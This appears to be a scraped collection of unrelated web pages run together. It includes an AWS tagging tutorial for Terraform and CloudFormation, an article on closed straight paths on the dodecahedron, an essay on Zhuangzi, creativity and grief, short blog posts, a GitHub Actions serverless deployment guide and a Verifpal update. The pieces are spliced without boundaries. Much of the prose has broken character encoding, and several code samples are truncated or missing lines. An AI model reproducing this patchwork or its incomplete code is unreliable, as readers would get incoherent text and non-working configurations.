<p>If you’re new to Terraform, they have a well-documented <a href="https://learn.hashicorp.com/terraform/getting-started/intro" target="_blank">Getting Started guide</a> and several <a href="https://github.com/terraform-providers/terraform-provider-aws/tree/master/examples" target="_blank">AWS template examples on GitHub</a>. In this section, I’ll show you some snippets from a demo Terraform project and module that <a href="https://github.com/CloudForecast/cf-terraform-demo" target="_blank">is available on GitHub</a>. You’ll learn the following in this Terraform AWS tags:</p>

<ol>
  <li>Tag a New AWS EC2 Instance with Terraform</li>
  <li>Using Terraform to Update Existing AWS Tags</li>
  <li>Enforce AWS Tags with Terraform</li>
</ol>

<h3 id="tag-a-new-aws-ec2-instance-with-terraform">Tag a New AWS EC2 Instance with Terraform</h3>

<p>If you want to deploy an EC2 instance with AWS Tags using Terraform, your configuration might include something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11

21
22
23
24
25
26
27
28
29
30
31
</pre></td><td><pre>resource "aws_instance" "cart" {
  connection {
    type = "ssh"
    user = "ubuntu"
    host = self.public_ip
    private_key = file(var.private_key_path)
  }

  instance_type = "t2.micro"

  ami = var.aws_amis[var.aws_region]

  key_name = aws_key_pair.auth.key_name

  vpc_security_group_ids = [aws_security_group.default.id]

  subnet_id = aws_subnet.default.id

  provisioner "remote-exec" {
    inline = [
      "sudo apt-get -y update",
      "sudo apt-get -y install nginx",
      "sudo service nginx start",
    ]
  }
  tags = {
    contact = "j-mark"
    env = "dev"
    service = "cart"
  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above example includes three AWS cost allocation tags: <code>contact</code>, <code>env</code>, and <code>service</code> with values described as strings. When you <a href="https://www.terraform.io/docs/commands/apply.html" target="_blank">apply this configuration</a>, Terraform will connect to AWS and deploy an EC2 instance having the AWS tags you specified.</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383259429_cf-2020-08-02-a.png" alt=""></p>

<h3 id="using-terraform-to-update-existing-aws-tags">Using Terraform to Update Existing AWS Tags</h3>

<p>Terraform makes it easy to update already existing resources with AWS tags in reversible and consistent ways. If you’re using AWS tags to keep track of a resource’s contact (e.g.: <code>j-mark</code> in the above example), you’re likely to need to update the AWS tag when the team member leaves or changes roles.</p>

<p>To update the AWS tags on your resource, simply update the corresponding tags in your Terraform configuration. The new tags will overwrite any previous tags assigned to the resource, including tags added outside of Terraform.</p>

<p>For example, to change the <code>contact</code> cost allocation tag on the EC2 instance above, you might update the <code>tags</code> block above with the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>tags = {
  contact = "l-duke"
  env = "dev"
  service = "cart"
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>When you apply this configuration, the AWS tags will be automatically updated in the AWS console:</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383277121_cf-2020-08-02-b.png" alt=""></p>

<p>If you keep your Terraform configuration files in version control - which is probably a good idea - you will be able to see how tags have changed over time. You can also review changes using the same code review process that your application code goes through to help you catch mistakes in the execution of your tagging strategy.</p>

<h3 id="enforce-aws-tags-with-terraform">Enforce AWS Tags with Terraform</h3>

<p>As your infrastructure grows, a code review process likely won’t be enough to prevent improper AWS tagging. Fortunately, you can enforce AWS tag names and values using <a href="https://www.terraform.io/docs/configuration/variables.html" target="_blank">variables</a> and custom validation rules in Terraform.</p>

<p>In the examples above, the <code>tags</code> list was hard-coded into the EC2 instance definition. A more scalable pattern would be to break your EC2 instance template into its own <a href="https://www.terraform.io/docs/configuration/modules.html" target="_blank">module</a> and use a <code>tags</code> variable. You can then write a <a href="https://www.terraform.io/docs/configuration/variables.html#custom-validation-rules" target="_blank">custom validation rule</a> to check that the tags comply with your strategy.</p>

<p>For example, if you want to check that:</p>

<ol>
  <li>The user specifies at least one tag</li>
  <li>The <code>contact</code> tag is either <code>j-mark</code> or <code>l-duke</code></li>
  <li>The <code>env</code> tag is set</li>
  <li>The <code>service</code> tag is either <code>cart</code> or <code>search</code></li>
</ol>

<p>You might create a module with a variable specified like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre>variable "tags" {
  description = "The tags for this resource."
  validation {
    condition = length(var.tags) &gt; 0 &amp;&amp; contains(["j-mark", "l-duke"], var.tags.contact) &amp;&amp; var.tags.env != null &amp;&amp; contains(["cart", "search", "cart:search"], var.tags.service)
    error_message = "Invalid resource tags applied."

  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now when you run <code>terraform plan</code> with a missing or invalid tag, you’ll get an error:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>Error: Invalid value for variable
...
Invalid resource tags applied.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Your rules can be as complex as <a href="https://www.terraform.io/docs/configuration/index.html" target="_blank">Terraform’s Configuration Language</a> allows, so functions like <code>regex()</code>, <code>substr()</code>, and <code>distinct()</code> are all available. That said, there are some caveats to this approach.</p>

<p>First, custom variable validation is an experimental feature in Terraform. <a href="https://www.terraform.io/docs/configuration/terraform.html#experimental-language-features" target="_blank">Experimental features</a> are subject to change, meaning that you might need to pay attention to Terraform update mores closely. To enable <code>variable_validation</code>, add the following to your <code>terraform</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>terraform {
  experiments = [variable_validation]
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Second, Terraform’s variable validation only happens during the <code>terraform plan</code> phase of your infrastructure’s lifecycle. It can’t prevent users from accidentally changing your tags directly in the AWS console, and it’s only as good as the validation rules you write. If you start using a new resource but forget to add validation rules, you might end up with lots of resources that don’t adhere to your tagging strategy.</p>

<p>Another option for paid Terraform Cloud customers is <a href="https://www.terraform.io/docs/cloud/sentinel/index.html" target="_blank">Sentinel</a>, which allows you to create custom policies for your resources. I won’t cover this method here, but Terraform has created an <a href="https://www.terraform.io/docs/cloud/sentinel/examples.html" target="_blank">example policy</a> to show you how to enforce mandatory AWS tags.</p>



<p>Similar to Terraform, AWS <a href="https://aws.amazon.com/cloudformation/" target="_blank">CloudFormation</a> lets you provision AWS resources based on configuration files. Unlike Terraform, CloudFormation is part of Amazon’s offerings, so it won’t necessarily help you if you want to use another infrastructure provider. The approach to tagging your resources in CloudFormation is similar to that used by Terraform, but as you’ll see, the configuration format is different.</p>

<p>If you’re new to AWS CloudFormation, <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/GettingStarted.Walkthrough.html" target="_blank">Amazon’s official walkthrough</a> will help you get started deploying some basic templates. In this section, I’ll show you some snippets from a demo AWS CloudFormation template which is <a href="https://github.com/CloudForecast/cf-cloudformation-demo" target="_blank">also available on GitHub</a>. You’ll learn the following in this Terraform AWS tags section:</p>

<ol>
  <li>AWS CloudFormation Template to Deploy Tags</li>
  <li>Using CloudFormation to Update AWS Tags</li>
  <li>CloudFormation Template to Enforce AWS Tags</li>
</ol>

<h3 id="aws-cloudformation-template-to-deploy-tags">AWS CloudFormation Template to Deploy Tags</h3>

<p>AWS CloudFormation is designed to make it easy to create AWS resources with a single template file. Using a CloudFormation template, every resource that can be deployed with an AWS tag.</p>

<p>For example, to create a new EC2 instance with the same three AWS tags used in the Terraform example above, add an array of <code>Tags</code> to the resource’s <code>Properties</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8

</pre></td><td><pre>"Resources" : {
  "WebServerInstance": {  
    "Type": "AWS::EC2::Instance",
    "Metadata" : {...},
    "Properties": {
      "Tags" : [
       {
          "Key" : "contact",
          "Value" : "j-mark"
       },
       {
          "Key" : "env",
          "Value" : "dev"
       },
       {
          "Key" : "service",
          "Value" : "cart"
       }
      ],
      ...       
    }
  },
  ...         
},
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a>, you can <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/create-stack.html" target="_blank">deploy this CloudFormation template as a new stack</a>. This will ensure your template is valid and create the specified resources with their tags on AWS:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you have lots of similar resources in your template, you can deploy AWS tags to all the resources in the stack at once using the <code>--tags</code>  flag with the <code>create-stack</code> or <code>update-stack</code> commands:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre># Creating a stack with tags
aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"

# Updating a stack with tags
aws cloudformation update-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="using-cloudformation-to-update-aws-tags">Using CloudFormation to Update AWS Tags</h3>

<p>If you want to change the contact on your EC2 instance created above, simply change the <code>Tags</code> section of your template file and use the <code>[update-stack](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html)</code> <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html" target="_blank">command</a> to deploy your changes.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre>"Tags" : [
 {
    "Key" : "contact",
    "Value" : "l-duke"
 },
  ...
],
</pre></td></tr></tbody></table></code></pre></div></div>

<p>AWS CloudFormation behaves the same way that Terraform does when you update tags outside your template file. Any tags set manually will be overridden by the <code>update-stack</code> …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>E</span>ven though mathematicians have spent over 2,000 years dissecting the structure of the five Platonic solids—the tetrahedron, cube, octahedron, icosahedron and dodecahedron—thereâ€™s still a lot we donâ€™t know about them.<br></p>

<p>Now, a trio of mathematicians has resolved one of the most basic questions about the dodecahedron.</p>
<p>Suppose you stand at one of the corners of a Platonic solid. Is there some straight path you could take that would eventually return you to your starting point without passing through any of the other corners? For the four Platonic solids built out of squares or equilateral triangles—the cube, tetrahedron, octahedron and icosahedron—mathematicians&nbsp;<a href="https://www.sciencedirect.com/science/article/abs/pii/S0012365X16302254?via%3Dihub" target="_blank">figured out</a>&nbsp;that the answer is no. Any straight path starting from a corner will either hit another corner or wind around forever without returning home. But with the dodecahedron, which is formed from 12 pentagons, mathematicians didnâ€™t know what to expect.</p>
<p>Now&nbsp;<a href="https://faculty.washington.edu/jathreya/" target="_blank">Jayadev Athreya</a>,&nbsp;<a href="http://userhome.brooklyn.cuny.edu/aulicino/" target="_blank">David Aulicino</a>&nbsp;and&nbsp;<a href="https://math.sci.ccny.cuny.edu/people?name=Pat_Hooper" target="_blank">Patrick Hooper</a>&nbsp;have shown that an infinite number of such paths do in fact exist on the dodecahedron. Their&nbsp;<a href="https://www.tandfonline.com/doi/abs/10.1080/10586458.2020.1712564" target="_blank">paper</a>, published in May 2020&nbsp;in&nbsp;<em>Experimental Mathematics,</em>&nbsp;shows that these paths can be divided into 31 natural families.</p>
<p>The solution required modern techniques and computer algorithms. â€œTwenty years ago, [this question] was absolutely out of reach; 10 years ago it would require an enormous effort of writing all necessary software, so only now all the factors came together,â€� wrote&nbsp;<a href="https://webusers.imj-prg.fr/~anton.zorich/" target="_blank">Anton Zorich</a>, of the Institute of Mathematics of Jussieu in Paris, in an email.</p>
<p>The project began in 2016 when Athreya, of the University of Washington, and Aulicino, of Brooklyn College, started playing with a collection of card stock cutouts that fold up into the Platonic solids. As they built the different solids, it occurred to Aulicino that a body of recent research on flat geometry might be just what theyâ€™d need to understand straight paths on the dodecahedron. â€œWe were literally putting these things together,â€� Athreya said. â€œSo it was kind of idle exploration meets an opportunity.â€�<br></p>
<p>Together with Hooper, of the City College of New York, the researchers figured out how to classify all the straight paths from one corner back to itself that avoid other corners.</p>
<p>Their analysis is â€œan elegant solution,â€� said&nbsp;<a href="http://math.uchicago.edu/~masur/" target="_blank">Howard Masur</a>&nbsp;of the University of Chicago. â€œItâ€™s one of these things where I can say, without any hesitation, â€˜Goodness, oh, I wish I had done that!â€™â€�</p>
<p><strong>Hidden Symmetries</strong></p>
<p>Although mathematicians have speculated about straight paths on the dodecahedron for more than a century, thereâ€™s been a resurgence of interest in the subject in recent years following gains in understanding â€œtranslation surfaces.â€� These are surfaces formed by gluing together parallel sides of a polygon, and theyâ€™ve proved useful for studying a wide range of topics involving straight paths on shapes with corners, from&nbsp;<a href="https://www.quantamagazine.org/new-shapes-solve-infinite-pool-table-problem-20170808/" target="_blank">billiard table trajectories</a>&nbsp;to the question of&nbsp;<a href="https://arxiv.org/abs/1407.2975" target="_blank">when a single light</a>&nbsp;can illuminate an entire mirrored room.</p>
<p>In all these problems, the basic idea is to unroll your shape in a way that makes the paths you are studying simpler. So to understand straight paths on a Platonic solid, you could start by cutting open enough edges to make the solid lie flat, forming what mathematicians call a net. One net for the cube, for example, is a T shape made of six squares.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/abstractions_b5cfddf2f49d5db00b5bd785f76c12dc.jpg" alt="nautilus paper dodecahed"><figcaption><span>A paper dodecahedron constructed in 2018 by David Aulicino and Jayadev Athreya to show that straight paths from a vertex back to itself while avoiding other vertices are in fact possible. </span><br><span>Patrick Hooper</span></figcaption></figure>
<p>Imagine that weâ€™ve flattened out the dodecahedron, and now weâ€™re walking along this flat shape in some chosen direction. Eventually weâ€™ll hit the edge of the net, at which point our path will hop to a different pentagon (whichever one was glued to our current pentagon before we cut open the dodecahedron). Whenever the path hops, it also rotates by some multiple of 36 degrees.<br></p>
<p>To avoid all this hopping and rotating, when we hit an edge of the net we could instead glue on a new, rotated copy of the net and continue straight into it. Weâ€™ve added some redundancy: Now we have two different pentagons representing each pentagon on the original dodecahedron. So weâ€™ve made our world more complicated—but our path has gotten simpler. We can keep adding a new net each time we need to expand beyond the edge of our world.</p>
<p>By the time our path has traveled through 10 nets, weâ€™ve rotated our original net through every possible multiple of 36 degrees, and the next net we add will have the same orientation as the one we started with. That means this 11th net is related to the original one by a simple shift—what mathematicians call a translation. Instead of gluing on an 11th net, we could simply glue the edge of the 10th net to the corresponding parallel edge in the original net. Our shape will no longer lie flat on the table, but mathematicians think of it as still â€œrememberingâ€� the flat geometry from its previous incarnation—so, for instance, paths are considered straight if they were straight in the unglued shape. After we do all such possible gluings of corresponding parallel edges, we end up with what is called a translation surface.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/abstractions_14ff01eeeec2fbef4da8d0a223f2a3e2.jpg" alt="nautilus arthreya"><figcaption><span>Athreyaâ€™s right arm bears a tattoo of his favorite translation surface — a double pentagon. </span><br><span>Radhika Govindrajan</span></figcaption></figure>
<p>The resulting surface is a highly redundant representation of the dodecahedron, with 10 copies of each pentagon. And itâ€™s massively more complicated: It glues up into a shape like a doughnut with 81 holes. Nevertheless, this complicated shape allowed the three researchers to access the rich theory of translation surfaces.<br></p>
<p>To tackle this giant surface, the mathematicians rolled up their sleeves—figuratively and literally. After working on the problem for a few months, they realized that the 81-holed doughnut surface forms a redundant representation not just of the dodecahedron but also of one of the most studied translation surfaces. Called the double pentagon, it is made by attaching two pentagons along a single edge and then gluing together parallel sides to create a two-holed doughnut with a rich collection of symmetries.</p>
<p>This shape also happened to be tattooed on Athreyaâ€™s arm. â€œThe double pentagon was something that I already knew and loved,â€� said Athreya, who got the tattoo a year before he and Aulicino started thinking about the dodecahedron.</p>
<p>Because the double pentagon and the dodecahedron are geometric cousins, the formerâ€™s high degree of symmetry can elucidate the structure of the latter. Itâ€™s an â€œamazing hidden symmetry,â€� said&nbsp;<a href="https://www.math.uchicago.edu/~eskin/" target="_blank">Alex Eskin</a>&nbsp;of the University of Chicago (who was Athreyaâ€™s doctoral adviser about 15 years ago). â€œThe fact that the dodecahedron has this hidden symmetry group is, I think, quite remarkable.â€�</p>

</center>
<p>The relationship between these surfaces meant that the researchers could tap into an algorithm for analyzing highly symmetric translation surfaces developed by&nbsp;<a href="https://www.math.kit.edu/iag3/~finster/en" target="_blank">Myriam Finster</a>&nbsp;of the Karlsruhe Institute of Technology in Germany. By adapting Finsterâ€™s algorithm, the researchers were able to identify all the straight paths on the dodecahedron from a corner to itself, and to classify these paths via the dodecahedronâ€™s hidden symmetries.<br></p>
<p>The analysis was â€œone of the most fun projects Iâ€™ve gotten to work on in my whole career,â€� Athreya said. â€œItâ€™s important to keep playing with things.â€�</p>
<p>The new result shows that even objects that have been studied for thousands of years can still hold secrets, Eskin said. â€œI think even for [the three mathematicians], it was very, very surprising to say something new about the dodecahedron.â€�</p>

The use-case is real-time search over key-value pairs where the keys are strings and the values are either strings, numbers, or dates. It should enable full-text search over keys and values and range queries over numbers and dates with 1.5 million unique key-value pairs as the expected maximum search index size. The search company Algolia recommends an <a href="https://blog.algolia.com/algolia-v-elasticsearch-latency/" target="_blank" rel="noopener noreferrer">end-to-end latency budget</a> of no more than 50ms, so we’ll use that as our threshold.</p><h2 id="postgresql"><a href="#postgresql" jsx="[object Object]"></a>PostgreSQL</h2><p>I’m already familiar with PostgreSQL, so let’s see if it meets these requirements.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>When I was 15</strong>, one of my closest friends died unexpectedly. Our physics teacher broke the news to me after Iâ€™d sat an exam, having wondered all the way through why my friend wasnâ€™t there doing the same. I still donâ€™t have the words to describe how I felt: it was something approaching shock, distress, disorientation. I didnâ€™t know what to think, much less what to do. I spent many nights awake and many days in a daze.</p>
<p>Fifteen years later, when I was in graduate school, another friend died suddenly, a man I loved very much. I remember checking my phone and finding out, to my dismay, via text message. But while my initial response was much the same as before, there was a palpable difference in how I felt later on. While I was again surprised and saddened, I was much less disoriented than Iâ€™d been as a teenager. I could still think, and I could still get things done. It seemed to me that Iâ€™d become better at living with loss.</p>
<p>You might think that the reason for this difference is obvious â€“ I was older, and Iâ€™d had more experience in coping with death. But raw experience alone isnâ€™t enough: what matters more is whether we learn from experience. And learning from experience, especially an experience as difficult as the death of a loved one, can involve quite a lot. Among other things, it can involve creativity.</p>
<p>This claim might seem surprising. After all, creativity is often associated with the idea of a lone creative genius, an individual who not only excels at what they do, but also transforms the world in the process. Further, even if we donâ€™t limit ourselves to romantic or heroic perspectives on the nature and value of creativity, itâ€™s commonly thought that creativity at least aims at novelty or originality.</p>
<p>This way of thinking about creativity isnâ€™t universal. The <a href="http://cup.columbia.edu/book/the-complete-works-of-zhuangzi/9780231164740"><em>Zhuangzi</em></a> (èŽŠå­�), a classical Chinese philosophical and literary text, provides a different perspective. On one interpretation, creativity isnâ€™t conceived as aiming at novelty or originality, but rather <em>integration</em>. Instead of aiming at something new, it aims at something that combines well with the situation of which itâ€™s a part.</p>
<p>The story of Wheelwright Pian, from a chapter of the Zhuangzi known as the <em>Tian Dao</em> (å¤©é�“), meaning â€˜Heavenâ€™s Wayâ€™ or â€˜The Way of Heavenâ€™, effectively illustrates this perspective on creativity as it pertains to artists or artisans. In this short vignette, a wheelwright known as Pian (æ‰�) tells a duke that the book of sagesâ€™ advice heâ€™s reading is nothing but â€˜chaff and dregsâ€™. Angered, the duke demands an explanation. The wheelwright responds that, at least concerning his craft, he can create what he does only because heâ€™s developed a â€˜knackâ€™ for it that canâ€™t be wholly conveyed in words. If the blows of his mallet are too gentle, his chisel slides and wonâ€™t take hold. If theyâ€™re too hard, it bites in and wonâ€™t budge. â€˜Not too gentle, not too hard â€“ you can get it in your hand and feel it in your mind,â€™ he says. â€˜So, Iâ€™ve gone along for 70 years and at my age Iâ€™m still chiselling wheels. When the men of old died, they took with them the things that couldnâ€™t be handed down. So, what you are reading there must be nothing but the chaff and dregs of the men of old.â€™</p>
<p>Although heâ€™s a â€˜lowlyâ€™ craftsperson, the wheelwright has something important to teach the duke. Heâ€™s been creating wheels by hand for many years and has developed an ability to act and to execute his craft in an integrated manner that canâ€™t be fully captured through an algorithmic list of instructions. He responds to precise particularities in the wood, his tools and his body to create what he wants â€“ something he doesnâ€™t accomplish by imposing a plan.</p>
<p>Striving for originality can be counterproductive when it comes to achieving genuinely fresh results</p>
<p>The sagesâ€™ advice for living well is therefore mere â€˜dregsâ€™ if itâ€™s interpreted as instructions that one can simply read and then complete. Living well in general involves much more than this; namely, a spontaneous integration between contrasting types such as the hard and the soft, as well as the learned and the spontaneous, the active and the passive, and even the unproductive and the productive â€“ all of which apply in the case of carving wheels, as well as elsewhere. In other words, living well involves creativity.</p>
<p>This kind of creativity isnâ€™t taken to aim at novelty or originality as such. The wheelwright is presented as creative not because of anything to do with his, or his projectsâ€™, novelty or originality, but instead because of his ability to create wheels in a sensitive, responsive and â€“ crucially â€“ well-integrated manner: one not learned by rote, but rather via engaging in sustained, spontaneous activity.</p>
<p>We can use the story of Wheelwright Pian to better understand why learning to live with loss is a creative pursuit. Although thereâ€™s an abundance of books dispensing advice on how to do so, ultimately learning to live with death is a deeply personal endeavour that â€“ like carving wheels â€“ canâ€™t be fully captured through a programmatic set of directions. We must respond to precise particularities of our situation (concerning our thoughts, feelings and overall circumstances) to create what we want to create (such as a sense of peace or closure). This isnâ€™t something that can be accomplished by imposing a plan, even if we make various provisional and highly malleable â€˜plansâ€™ on the fly as we go along.</p>
<p>Moreover, in working through our thoughts, feelings and circumstances in all their particularities, itâ€™s not that weâ€™re doing anything all that different from what countless others have had to do as theyâ€™ve learned to cope with loss. Nonetheless â€“ again, like carving wheels â€“ itâ€™s plausibly a creative activity, in that it involves a spontaneous integration between contrasting types such as the grieving and the celebratory, the resentful and the grateful, the distressed and the joyous. The ability to live with death, too, in a sensitive, responsive, and well-integrated manner isnâ€™t learned by rote, but rather via engaging in sustained, spontaneous activity. Indeed, even the philosopher Zhuangzi himself can be understood as engaging in such a creative process after the death of his own wife in chapter 18 of the text, the <em>Zhi Le</em> (è‡³æ¨‚), meaning â€˜Perfect Happinessâ€™ or â€˜Perfect Joyâ€™.</p>
<p><strong>This way of thinking</strong> about creativity has a variety of other potential benefits. First, even if creativity were taken to aim at originality, de-emphasising originality might ironically result in greater creativity. This is because striving for originality can actually be counterproductive when it comes to achieving genuinely fresh results: if we focus on the task of achieving something original, weâ€™ll explore only the range of possibilities deemed sufficiently likely to yield that result, leaving out a lot that could have contributed to achieving something original.</p>
<p>But imagine instead that we worked with idea that creativity wasnâ€™t about novelty. That doesnâ€™t mean weâ€™d have to give up the value of originality entirely, but rather see it as one of a range of possible outcomes. Casting a wider net in this way might hence make creativity (whatever it involves) easier to achieve.</p>
<p>Second, focusing on integration could encourage us to better understand creative agents as being intimately connected with, and products of, their environments. This would broaden our notion of creativity in a way that might allow us to see creativity demanded in a greater range of activities. After all, many of lifeâ€™s activities, from the mundane to the meaningful, arenâ€™t learned by rote, but rather via spontaneous action that integrates contrasting aspects. Just for starters, additional examples might include getting along with oneâ€™s family, building relationships with colleagues and organising oneâ€™s finances.</p>
<p>This alternative perspective on creativity might help us to see it as an everyday phenomenon in which we all participate â€“ rather than an extraordinary talent or gift that only a few enjoy. And it might also allow us to make sense of the idea of <a href="https://link.springer.com/chapter/10.1007/978-3-319-43893-1_19#:~:text=As%20an%20art%20practice%2C%20calligraphy,Daoist%20aesthetic%20concerns%20discussed%20here.&amp;text=The%20aesthetic%20of%20the%20everyday,and%20the%20need%20for%20imagination">living creatively</a>: of an integrated life, lived spontaneously, in which all of lifeâ€™s contrasting aspects can be arranged to form a rich and variegated whole.</p></div></div></div>]]>

<p>One of my favorite team jelling accelerators is to <em>find a sweet team name</em>.</p>



<p>The classic book “Peopleware” by Tom DeMarco says that a jelled team should have a sense of eliteness, almost a cult-like team pride. I’ve done <a href="https://critter.blog/2016/10/27/the-whys-and-hows-of-jelling-teams/">my share of rambling about that</a> too. </p>



<p>All successful have great names, so obviously your team should have one too. Simple logic. A team name gives you an identity to rally around. </p>



<p>Calling your team “The ClientNameHere Project Team” is like calling the Vikings “The Minnesota NFL Team.” Imagine the uniforms. Good luck rallying around that.</p>



<p>A good team name has 3 criteria:</p>



<ul><li><strong>It comes about organically</strong>. If you force it then it’ll feel like you’re trying too hard, and it won’t stick. Let it arise out of a memorable conversation or an inside joke, and just give it some gentle nudging.</li><li><strong>It works in both the plural and singular form</strong>. If your team is “The Fiddly Bits” then you can say “I’m a Fiddly Bit”. That works. But if it’s “Team Super Awesome”, then you have to say something like “I am a member of Team Super Awesome.” It doesn’t have the same punch to it.</li><li><strong>It has a visual representation</strong>, such as a mascot or logo or GIF  that you can spam on Slack when the team does something right. As they say, a picture is worth a thousand Slack messages.</li></ul>



<p>Here are some of the teams I’ve been on in the past few years:</p>







<p>Does your team have a name? <a href="https://twitter.com/mcrittenden">Tweet me</a> and let me know!</p>

<blockquote><p>“Death is very likely the single best invention of life. It is life’s change agent. It clears out the old to make way for the new.”</p><cite>— Steve Jobs</cite></blockquote>



<p>Human mortality is one of the strongest forces we have, helping us focus on what is truly important, and pushing us to get things done.</p>



<p>Imagine you were to live forever. </p>



<p>Would you really finish this project now, if you can always wait another year?</p>



<p>Would you really face your challenges, if there is always another day?</p>



<p>Would you really seek to become stronger and better, if you could just chill without any real consequences?</p>



<p>The end of death would be the end of motivation.</p>



<p>Our mortality is the ultimate anti-procrastinator. You never know when the proverbial bus will hit you. Next month? Next year? Next decade?</p>



<p>It shakes us, awakens us from wasting time. Reboots our priorities.</p>



<p>The notion of death might be scary. But living forever might be even scarier. So think twice before you wish to live forever.</p>

You can Build, test, and deploy your code right from GitHub. In this post we will explore how you can use GitHub Actions to automate serverless application deployment on AWS. You can also use AWS's own CI/CD services to achieve the same. But here we are going to keep our discussion limited to GitHub Actions.</p>
<h3 id="how-to-use-github-actions">How to use GitHub Actions?</h3>
<p>Creating a GitHub action is simple. Go to your GitHub repository that you want to automate and click on "Actions"
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/github-action-create-new.PNG" alt="github actions new workflow"></p>
<p>You will be taken to Actions page where you can create a new Blank workflow or select existing actions from the marketplace. The actions from marketplace are reusable actions that you can use in your workflow. We are going to create a blank action and we will also use some actions from marketplace.
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/github-actions-blank-workflow.PNG" alt="github actions blank action"></p>
<p>Lets rename the YAML file to workflow.yml. You can name anything you like. We are going to create a Lambda function with API gateway in Serverless Application Model (SAM) template and deploy it using GitHub Actions. 
Below is our SAM template.</p>
<pre><code>AWSTemplateFormatVersion: '2010-09-09'
Transform: AWS::Serverless-2016-10-31
Description: &gt;
  GitHub Actions demonstration App

</code></pre>
<p><a href="http://lambda.py/" target="_blank">lambda.py</a></p>
<pre><code><span><span>def</span> <span>handler</span><span>(event, context)</span>:</span>

        ,
        <span>"isBase64Encoded"</span>: <span>False</span>
    }
</code></pre><p>This contains one Lambda function and API with path hello. Lets first deploy manually using SAM CLI and then we will automate it. Create samconfig.toml with below details.
create s3_bucket that will be used for SAM deploy and update in samconfig.toml.</p>
<pre><code><span>version</span> = <span>0.1</span>
<span>[default]</span>
<span>[default.deploy]</span>
<span>[default.deploy.parameters]</span>
<span>stack_name</span> = <span>"sam-github-actions-app"</span>
<span>s3_bucket</span> = <span>"aws-sam-cli-managed-default-samclisourcebucket-1xyg1t2j2ws5k"</span>
<span>s3_prefix</span> = <span>"sam-app"</span>
<span>region</span> = <span>"us-east-1"</span>
<span>confirm_changeset</span> = <span>false</span>
<span>capabilities</span> = <span>"CAPABILITY_IAM"</span>
</code></pre><p>Also create empty requirements.txt along with template.yml. Run <strong>SAM build</strong> and <strong>SAM deploy -g</strong> on CLI. 
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/sam-deploy.PNG" alt="SAM Deploy"></p>
<p>Go to API gateway and hit the url in browser. You should get "hello from Lambda!" response.
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/api.PNG" alt="github actions api"></p>
<p>Go back to our workflow file on GitHub. We will deploy as soon as we push updates to the repo.
Below is our workflow.yml</p>
<pre><code># This is a basic workflow to help you get started with Actions

<p>We first indicate that we want to run this action on push to the master. Then we select runner (Ubuntu) on which our steps will execute. In Steps, we first checkout code, then install python and its dependencies. Then we use other actions from marketplace to configure AWS credentials and then we use another action to do SAM build and SAM deploy.  Please note that we need ti supply AWS ACCESS KEY and SECRET ACCESS KEY to actions for commands to work. We setup here GitHub Secrets.</p>

<p>As soon as you check-in workflow.yml, the action would trigger.

<p>Last week, Verifpal, our cryptographic protocol modeling and analysis framework, celebrated its one-year anniversary. In its first year, Verifpal has made some significant achievements.</p>



<h2>Improvements to Usability, Features, and Reliability</h2>



<p><strong><span>First</span>, Verifpal has improved its relationship with users.</strong> Verifpal was <a href="https://nlnet.nl/news/2020/20200611-SecureVideochatVerifpal.html">part of Zoom’s effort</a> to modernize its cryptography. <a href="https://www.youtube.com/watch?v=it_hJkVU-UA">Verifpal for Visual Studio Code</a> and <a href="https://verifhub.verifpal.com/">VerifHub</a> allowed engineers to model and collaborate on cryptographic protocols more easily than ever. And <a href="https://twitter.com/verifpal/status/1285662686894850050">better attack traces</a> allowed for easier to understand analysis results.</p>



